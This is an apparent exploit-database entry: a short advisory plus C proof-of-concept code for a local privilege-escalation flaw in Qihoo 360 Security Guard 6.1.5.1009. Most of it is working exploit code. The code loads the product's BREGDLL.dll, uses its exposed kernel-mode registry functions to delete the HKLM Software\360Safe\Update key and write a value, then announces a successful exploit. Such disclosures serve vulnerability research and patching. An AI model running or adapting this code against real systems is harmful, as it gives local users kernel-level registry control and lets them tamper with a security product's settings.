/*
# Software Link: [http://sd.360.cn/sd_download1.html?src=360home]
# Version: [6.1.5.1009]
# Tested on: [Windows xp]

Vendor            : Qihoo 360
Affected Software : 360 Security Guard 6.1.5.1009


Description:

Qihoo 360 Security Guard is very famous in China.

Some vulnerabilities have been reported in Qihoo 360 Security Guard, which can be exploited by malicious, local users to gain escalated privileges.

An error in the kernel-mode driver (bregdrv.sys) when handling input passed through the user-mode dynamic link library (bregdll.dll) can be exploited to

read/write/modification registry in kernel mode.

An attacker can exploit this issue to read/write/modification registry with kernel-level privileges. Successful exploits will result in the complete

compromise of affected computers.


Details:

The kernel-mode driver (bregdrv.sys) use CmXxx series functions to read/write/modification registry with kernel-level privileges, bregdll.dll wrappers

implementation, the bregdll.dll improperly validating input passed from user mode to the kernel. All users can obtain handle of unprotected device

bregdrv.sys to read/write/modification registry with kernel-level privileges.


POC:
*/

#include <windows.h>

typedef BOOL (WINAPI *INIT_REG_ENGINE)();
typedef LONG (WINAPI *BREG_DELETE_KEY)(HKEY hKey, LPCSTR lpSubKey);
typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);
typedef LONG (WINAPI *REG_SET_VALUE_EX)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);

BREG_DELETE_KEY BRegDeleteKey = NULL;
BREG_OPEN_KEY BRegOpenKey = NULL;
BREG_CLOSE_KEY BRegCloseKey = NULL;
REG_SET_VALUE_EX BRegSetValueEx = NULL;

#define AppPath   "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\360safe.exe"

#define TestDeleteKey  HKEY_LOCAL_MACHINE
#define TestDeleteRegPath "Software\\360Safe\\Update"

#define TestSetKey  HKEY_LOCAL_MACHINE
#define TestSetPath  "Software\\360Safe"

BOOL InitBRegDll()
{
 LONG lResult;
 HKEY hKey;

 CHAR cPath[MAX_PATH + 32] = { 0 };
 DWORD dwPathLen = MAX_PATH;

 lResult = RegOpenKeyA(HKEY_LOCAL_MACHINE, AppPath, &hKey);
 if (FAILED(lResult))
  return FALSE;

 DWORD dwType = REG_SZ;
 lResult = RegQueryValueExA(hKey, "Path", NULL, &dwType, (LPBYTE)cPath, &dwPathLen);
 RegCloseKey(hKey);
 if (FAILED(lResult))
  return FALSE;

 strcat(cPath, "\\deepscan\\BREGDLL.dll<file://\\deepscan\\BREGDLL.dll>");

 HMODULE modBReg = LoadLibraryA(cPath);
 if (!modBReg)
  return FALSE;

 INIT_REG_ENGINE InitRegEngine = (INIT_REG_ENGINE)GetProcAddress(modBReg, "InitRegEngine");
 BRegDeleteKey = (BREG_DELETE_KEY)GetProcAddress(modBReg, "BRegDeleteKey");
 BRegOpenKey = (BREG_OPEN_KEY)GetProcAddress(modBReg, "BRegOpenKey");
 BRegCloseKey = (BREG_CLOSE_KEY)GetProcAddress(modBReg, "BRegCloseKey");
 BRegSetValueEx = (REG_SET_VALUE_EX)GetProcAddress(modBReg, "BRegSetValueEx");

 if (!InitRegEngine || !BRegDeleteKey || !BRegOpenKey || !BRegCloseKey || !BRegSetValueEx) {
  FreeLibrary(modBReg);
  return FALSE;
 }

 if (!InitRegEngine()) {
  FreeLibrary(modBReg);
  return FALSE;
 }

 return TRUE;
}

LONG TestSetRegKey()
{
 HKEY hKey;
 LONG lResult;

 lResult = BRegOpenKey(TestSetKey, TestSetPath, &hKey);
 if (FAILED(lResult))
  return lResult;

 DWORD dwType = REG_SZ;
 static char szData[] = "TEST VALUE";
 lResult = BRegSetValueEx(hKey, TestSetPath, NULL, dwType, (const BYTE *)&szData, (DWORD)sizeof(szData));
 BRegCloseKey(hKey);

 return lResult;
}

int main(int argc, char *argv[])
{
 if (!InitBRegDll()) {
  MessageBoxA(NULL, "Initialization BReg error&#65281;", "error", MB_ICONSTOP);
  return 1;
 }

 if (FAILED(BRegDeleteKey(TestDeleteKey, TestDeleteRegPath))) {
  MessageBoxA(NULL, "DeleteKey error&#65281;", "error", MB_ICONSTOP);
  return 2;
 }

 if (FAILED(TestSetRegKey())) {
  MessageBoxA(NULL, "SetRegKey error&#65281;", "error", MB_ICONSTOP);
  return 3;
 }

 MessageBoxA(NULL, "Broke System Security Check&#65292;Gain Escalated Privileges&#65292;Successful exploit&#65281;", "Successful", MB_OK);
 return 0;
}

